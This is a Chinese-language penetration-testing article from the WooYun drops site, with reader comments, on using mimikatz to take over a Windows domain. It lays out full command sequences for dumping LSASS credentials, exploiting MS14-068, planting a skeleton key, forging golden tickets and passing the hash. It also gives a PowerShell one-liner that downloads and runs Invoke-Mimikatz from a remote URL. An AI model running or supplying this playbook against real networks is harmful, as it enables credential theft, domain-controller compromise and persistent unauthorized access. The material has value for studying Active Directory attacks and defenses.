<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">内网渗透中的mimikatz</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">三好学生</a> <span class="bull">·</span> <time title="2015/07/31 10:30" ui-time="" datetime="2015/07/31 10:30" class="published ng-binding ng-isolate-scope">2015/07/31 10:30</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 前言</h1><hr><p>上篇测试了中间人攻击利用框架bettercap，这次挑选一款更具代表性的工具——mimikatz</p><p><img alt="这里写图片描述" img-src="ae1de40b1781b45c61de7cdd9dfaccd2b2971229.jpg"></p><h1>0x01 简介</h1><hr><p>mimikatz，很多人称之为密码抓取神器，但在内网渗透中，远不止这么简单</p><h1>0x02 测试环境</h1><hr><p>网络资源管理模式：</p><pre><code>域
</code></pre><p>已有资源：</p><pre><code>域内一台主机权限
操作系统：win7 x64
域权限:普通用户
</code></pre><h1>0x03 测试目标</h1><hr><p>1、获得域控权限 2、导出所有用户口令 3、维持域控权限</p><h1>0x04 测试过程</h1><hr><h3>1、获取本机信息</h3><p><strong>mimikatz</strong>：</p><pre><code>privilege::debug
sekurlsa::logonpasswords
</code></pre><p>获取本机用户名、口令、sid、LM hash、NTLM hash 如图 <img alt="这里写图片描述" img-src="50ba40c4f2077af80d351302342f68da4c483e51.jpg"></p><h3>2、攻击域控，获得权限</h3><p>使用ms14-068漏洞</p><pre><code>ms14-068.exe -u -p -s -d 
</code></pre><p>生成伪造缓存test.ccache:</p><p>如图 <img alt="这里写图片描述" img-src="fa682894ef5172fefa88b9a746d5f016b960ded4.jpg"> 导入伪造缓存: <strong>mimikatz：</strong></p><pre><code>kerberos::ptc test.ccache
</code></pre><p>登陆：</p><pre><code>net use \\A-635ECAEE64804.TEST.LOCAL
dir \\A-635ECAEE64804.TEST.LOCAL\c$
</code></pre><p>获得域控权限，如图 <img alt="这里写图片描述" img-src="dce0d3c32d7ed09945f254232d0ff9b605ffa82c.jpg"></p><h3>3、导出域控信息</h3><p>（1）直接获取内存口令 <strong>mimikatz：</strong></p><pre><code>privilege::debug
sekurlsa::logonpasswords
</code></pre><p>（2）通过内存文件获取口令 使用procdump导出lsass.dmp <strong>mimikatz：</strong></p><pre><code>sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords full
</code></pre><p>（3）通过powershell加载mimikatz获取口令</p><pre><code>powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz
</code></pre><p>（4）导出所有用户口令 使用Volue Shadow Copy获得SYSTEM、SAM备份（之前文章有介绍） <strong>mimikatz：</strong></p><pre><code>lsadump::sam SYSTEM.hiv SAM.hiv
</code></pre><h3>4、维持域控权限</h3><p>（1）Skeleton Key <strong>mimikatz：</strong></p><pre><code>privilege::debug
misc::skeleton
</code></pre><p>万能钥匙，可使用任意用户登陆域控</p><pre><code>net use \\A-635ECAEE64804.TEST.LOCAL mimikatz /user：test
</code></pre><p>如图 <img alt="这里写图片描述" img-src="b347730dc1d295b3254ea6f60e35f79bf02cdf59.jpg"></p><p>（2）golden ticket <strong>mimikatz：</strong></p><pre><code>lsadump::lsa /patch
</code></pre><p>获取krbtgt的ntlmhash，如图 <img alt="这里写图片描述" img-src="8e496641fa6b2c51b4fd212fe7f1085757fada43.jpg"></p><p>生成万能票据： <strong>mimikatz：</strong></p><pre><code>kerberos::golden /user:Administrator /domain:test.local /sid:S-1-5-21-2848411111-3820811111-1717111111 /krbtgt:d3b949b1f4ef947820f0950111111111 /ticket:test.kirbi
</code></pre><p>导入票据： <strong>mimikatz：</strong></p><pre><code>kerberos::ptt test.kirbi
</code></pre><p>登陆域控：</p><pre><code>net use \\A-635ECAEE64804.TEST.LOCAL
dir \\A-635ECAEE64804.TEST.LOCAL\c$
</code></pre><p>如图 <img alt="这里写图片描述" img-src="f6d6df1223ff308f1bc9364ef78a0b8662ba3dbb.jpg"></p><p><strong><em>Tips:</em></strong></p><pre><code>Golden Ticket不多说，自行理解
By default, the Golden Ticket default lifetime is 10 years
password changing/smartcard usage does not invalidate Golden Ticket;
this ticket is not emitted by the real KDC, it's not related to ciphering methods allowed;
NTLM hash of krbtgt account is never changed automatically.
</code></pre><p>（3）Pass-The-Hash <strong>mimikatz：</strong></p><pre><code>sekurlsa::pth /user:Administrator /domain:test.local /ntlm:cc36cf7a8514893efccd332446158b1a
</code></pre><p>如图 <img alt="这里写图片描述" img-src="7646654f4c08354ce04956dde06851b3eec7e56d.jpg"></p><h3>5、补充</h3><p>登陆域控，刷新扫雷记录，留下名字;D <strong>mimikatz：</strong></p><pre><code>minesweeper::infos
</code></pre><p>如图 <img alt="这里写图片描述" img-src="79eb83df4bf0f6f285b69ac9a1845f4299a61396.jpg"></p><h1>0x05 小结</h1><hr><p>本文重点在于介绍mimikatz在内网渗透中的常用方法，其它细节做了适当省略，可在后续详细介绍细节。</p><p><strong>本文由三好学生原创并首发于乌云drops，转载请注明，谢谢</strong> 神器在手，会用才行；） 水平有限，欢迎补充。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/12159" rel="bookmark" id="re1">域渗透——Pass The Ticket</a></li><li><a href="http://drops.wooyun.org/tips/11631" rel="bookmark" id="re2">域渗透——Pass The Hash &amp; Pass The Key</a></li><li><a href="http://drops.wooyun.org/tips/9591" rel="bookmark" id="re3">域渗透的金之钥匙</a></li><li><a href="http://drops.wooyun.org/tools/12754" rel="bookmark" id="re4">Mimikatz 非官方指南和命令参考_Part3</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">火风暴</span> <span class="reply-time">2015-08-02 15:09:45</span></div><p></p><p>gj</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">milk</span> <span class="reply-time">2015-08-02 13:44:56</span></div><p></p><p>感谢了，之前研究过本来准备打算写出来的。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">动后河</span> <span class="reply-time">2015-08-01 21:57:20</span></div><p></p><p>我一直在思索我进的内网到底是 没有域控 还是 没找到域控 呢？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">三好学生</span> <span class="reply-time">2015-07-31 21:56:07</span></div><p></p><p>@浮生 重要的是积累，里面提到的每一个详细讲都能发篇文章</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">浮生</span> <span class="reply-time">2015-07-31 15:50:14</span></div><p></p><p>会英语真好。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">CplusHua</span> <span class="reply-time">2015-07-31 14:40:27</span></div><p></p><p>good! 感谢三好学生,年底让大大给你发奖状...</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">hack2012</span> <span class="reply-time">2015-07-31 10:43:57</span></div><p></p><p>学习了，有空研究一下。</p><p></p></div></div></div></div></div></main>